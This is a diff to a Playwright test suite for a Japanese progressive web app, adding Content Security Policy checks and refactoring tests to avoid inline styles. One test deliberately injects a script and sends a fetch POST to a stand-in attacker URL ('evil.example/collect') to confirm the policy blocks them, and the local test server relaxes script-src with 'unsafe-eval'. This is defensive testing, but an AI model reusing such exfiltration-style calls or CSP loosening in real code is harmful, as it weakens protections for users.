@@ -27,6 +27,15 @@ Object.defineProperty(Document.prototype, 'hidden', { configurable: true, get() 
 """
 # 設定済み（ready）の状態を作る
 READY = "localStorage.setItem('setup.done','1')"
+# 読み込んでよいものの決まり（CSP。D-076 ③）に反したら、その画面の JS エラーとして数える（どのテストでも見張る）。
+# テストで見た目を足すときは、style タグではなく CSSOM（setProperty・insertRule）を使う（CSP で止められるため）
+CSP_GUARD = """
+window.__csp = [];
+document.addEventListener('securitypolicyviolation', (e) => {
+  window.__csp.push(e.violatedDirective + ' ' + e.blockedURI);
+  throw new Error('CSP違反: ' + e.violatedDirective + ' ' + e.blockedURI);
+});
+"""
 # ヘッドレスChromeは本物のプッシュ購読ができない（外部通信が必要）ため、購読処理だけ偽物にする
 FAKE_PUSH = """
 PushManager.prototype.getSubscription = async () => null;
@@ -48,6 +57,24 @@ def make_png(w, h, rgba):
 class QuietHandler(SimpleHTTPRequestHandler):
     extensions_map = {**SimpleHTTPRequestHandler.extensions_map, ".webmanifest": "application/manifest+json"}
 
+    # Playwright の wait_for_function は、待つあいだ画面の中で文字列を JS として評価する（eval）。CSP（D-076 ③）はそれを止めるので、
+    # ふつうのテストでは eval だけを許して配り、CSP のほかの決まり（通信先・差し込みのスクリプト・style タグ）はそのまま効かせる。
+    # /strict/ の下は、公開するものと同じ CSP のまま配る（CSP そのもののテスト用）
+    def do_GET(self):
+        if self.path.startswith("/strict/"):
+            self.path = self.path[len("/strict"):]
+            return super().do_GET()
+        name = self.path.split("?")[0].split("#")[0]
+        if name in ("/index.html", "/send.html"):
+            body = (APP_DIR / name[1:]).read_bytes().replace(b"script-src 'self';", b"script-src 'self' 'unsafe-eval';", 1)
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return None
+        return super().do_GET()
+
     def log_message(self, *a):
         pass
 
@@ -63,6 +90,14 @@ class PwaTest(unittest.TestCase):
         cls.browser = cls.pw.chromium.launch(
             executable_path="/usr/bin/google-chrome",
         )
+        new_context = cls.browser.new_context
+
+        def guarded_context(*a, **k):
+            ctx = new_context(*a, **k)
+            ctx.add_init_script(CSP_GUARD)
+            return ctx
+
+        cls.browser.new_context = guarded_context
 
     @classmethod
     def tearDownClass(cls):
@@ -99,6 +134,54 @@ class PwaTest(unittest.TestCase):
         # 画面の版と sw.js のキャッシュ版が一致している（更新し忘れ防止）
         sw = (APP_DIR / "sw.js").read_text(encoding="utf-8")
         self.assertIn(f"const CACHE_VERSION = '{page.text_content('#app-version')}'", sw)
+
+    def test_csp_is_strict_and_every_screen_loads_without_violations(self):
+        """CSP（D-076 ③）：スクリプトはこのサイトのファイルだけ。どの画面を開いても違反が出ない（違反は CSP_GUARD が JS エラーにする）"""
+        index = (APP_DIR / "index.html").read_text(encoding="utf-8")
+        send = (APP_DIR / "send.html").read_text(encoding="utf-8")
+        for html in (index, send):
+            csp = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', html).group(1)
+            self.assertIn("script-src 'self';", csp)
+            self.assertIn("object-src 'none'", csp)
+            self.assertIn("base-uri 'none'", csp)
+            self.assertNotIn("unsafe-eval", csp)
+            self.assertNotIn("connect-src *", csp)
+        index_csp = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', index).group(1)
+        self.assertNotIn("unsafe-inline", index_csp)
+        self.assertNotIn("<script>", index)
+        self.assertNotIn(' style="', index)
+        page = self.new_page(permissions=["notifications"], init_script=READY)
+        page.goto(self.base + "strict/index.html?mode=standalone")  # 公開するものと同じ CSP
+        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
+        for view in ["tasks", "report", "timer", "schedule", "settings", "system", "home"]:
+            page.evaluate("(v) => { location.hash = '#' + v; }", view)
+            page.wait_for_selector(f"#view-{view}", state="visible", timeout=3_000)
+        self.assertEqual(page.evaluate("window.__csp"), [])
+        page2 = self.new_page()
+        page2.goto(self.base + "strict/send.html")
+        page2.wait_for_selector("#send-status", state="attached")
+        self.assertNotEqual(page2.input_value("#click"), "")
+        self.assertEqual(page2.evaluate("window.__csp"), [])
+
+    def test_csp_blocks_injected_script_and_unknown_hosts(self):
+        """CSP が効いている：差し込まれたスクリプトは動かず、決めていない送り先には通信しない"""
+        ctx = self.browser.new_context()
+        self.addCleanup(ctx.close)
+        page = ctx.new_page()
+        page.goto(self.base + "strict/index.html")
+        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
+        ran = page.evaluate("""() => new Promise((resolve) => {
+          const s = document.createElement('script');
+          s.textContent = 'window.__injected = 1';
+          document.body.append(s);
+          setTimeout(() => resolve(window.__injected === 1), 50);
+        })""")
+        self.assertFalse(ran)
+        blocked = page.evaluate("() => fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).then(() => false, () => true)")
+        self.assertTrue(blocked)
+        violations = page.evaluate("window.__csp")
+        self.assertTrue(any(v.startswith("script-src") for v in violations), violations)
+        self.assertTrue(any(v.startswith("connect-src") for v in violations), violations)
 
     def test_opened_from_notification_is_detected(self):
         page = self.new_page()
@@ -263,10 +346,13 @@ class PwaTest(unittest.TestCase):
         page.goto(self.base + "index.html?mode=standalone" + query)
         return page
 
-    def clock_page(self, hour, minute, query="", size=(393, 852), safe=None, day=9, init_script=None):
-        """時刻と画面の大きさを決めて、設定済みの状態でホームを開く。safe=(上, 下) でセーフエリアを模す。"""
+    def clock_page(self, hour, minute, query="", size=(393, 852), safe=None, day=9, init_script=None, routes=None):
+        """時刻と画面の大きさを決めて、設定済みの状態でホームを開く。safe=(上, 下) でセーフエリアを模す。
+        routes={URL の形: 処理} で、開く前から通信を差し替える"""
         ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": size[0], "height": size[1]})
         self.addCleanup(ctx.close)
+        for pattern, handler in (routes or {}).items():
+            ctx.route(pattern, handler)
         ctx.add_init_script(READY)
         ctx.add_init_script(VISIBILITY)
         if init_script:
@@ -278,7 +364,7 @@ class PwaTest(unittest.TestCase):
         page.clock.install(time=datetime(2026, 11, day, hour, minute, 0))
         page.goto(self.base + "index.html?mode=standalone" + query)
         if safe:
-            page.add_style_tag(content=":root{--safe-top:%dpx;--safe-bottom:%dpx}" % safe)
+            page.evaluate("([t, b]) => { const r = document.documentElement.style; r.setProperty('--safe-top', t + 'px'); r.setProperty('--safe-bottom', b + 'px'); }", list(safe))
         page.wait_for_function("dialogue !== null", timeout=3_000)
         return page
 
@@ -612,8 +698,9 @@ class PwaTest(unittest.TestCase):
         ctx = self.browser.new_context(permissions=["notifications"])
         self.addCleanup(ctx.close)
         ctx.add_init_script(READY)
+        # 画面の route だと、Service Worker が先に動き出したときにその取得を素通りする。ブラウザ全体（ctx）で差し替える
+        ctx.route("**/img/portrait.webp", lambda r: r.fulfill(status=200, content_type="image/png", body=png))
         page = ctx.new_page()
-        page.route("**/img/portrait.webp", lambda r: r.fulfill(status=200, content_type="image/png", body=png))
         page.goto(self.base + "index.html?mode=standalone")
         page.wait_for_function("document.getElementById('portrait').dataset.art === 'ready'", timeout=3_000)
         self.assertEqual(page.get_attribute("#portrait", "role"), "img")
@@ -663,7 +750,7 @@ class PwaTest(unittest.TestCase):
     def test_switch_shows_state_with_track_and_knob(self):
         """スイッチは溝とつまみで状態を見せ、オンはライム（CR-F07）。文字（オン／オフ）とaria-checkedはそのまま。"""
         page = self.clock_page(21, 0, "#settings")
-        page.add_style_tag(content="*, *::before, *::after { transition: none !important; }")  # 動きの途中の色を読まない
+        page.evaluate("() => { const s = document.styleSheets[0]; s.insertRule('*, *::before, *::after { transition: none !important; }', s.cssRules.length); }")  # 動きの途中の色を読まない
         track = lambda: page.evaluate("getComputedStyle(document.getElementById('pref-lines'), '::before').backgroundColor")
         self.assertEqual(track(), "rgb(185, 227, 95)")
         page.click("#pref-lines")
@@ -708,8 +795,8 @@ class PwaTest(unittest.TestCase):
 
     def test_sync_error_shown_on_settings(self):
         """スプレッドシートへの控えが失敗したら、設定のいちばん上に出す（CR-F11）。"""
-        init = "localStorage.setItem('db.sync', JSON.stringify({ url: 'https://example.invalid/exec', token: 't', lastAt: 0, lastSig: '', dirty: true, error: '通信できません' }));"
-        page = self.clock_page(21, 0, "#settings", init_script=init)
+        init = "localStorage.setItem('db.sync', JSON.stringify({ url: 'https://script.google.com/macros/s/offline/exec', token: 't', lastAt: 0, lastSig: '', dirty: true, error: '通信できません' }));"
+        page = self.clock_page(21, 0, "#settings", init_script=init, routes={"https://script.google.com/**": lambda r: r.abort()})
         page.wait_for_selector("#sync-alert", state="visible", timeout=3_000)
         self.assertIn("送れていません（通信できません）", page.text_content("#sync-alert"))
         page2 = self.clock_page(21, 0, "#settings")
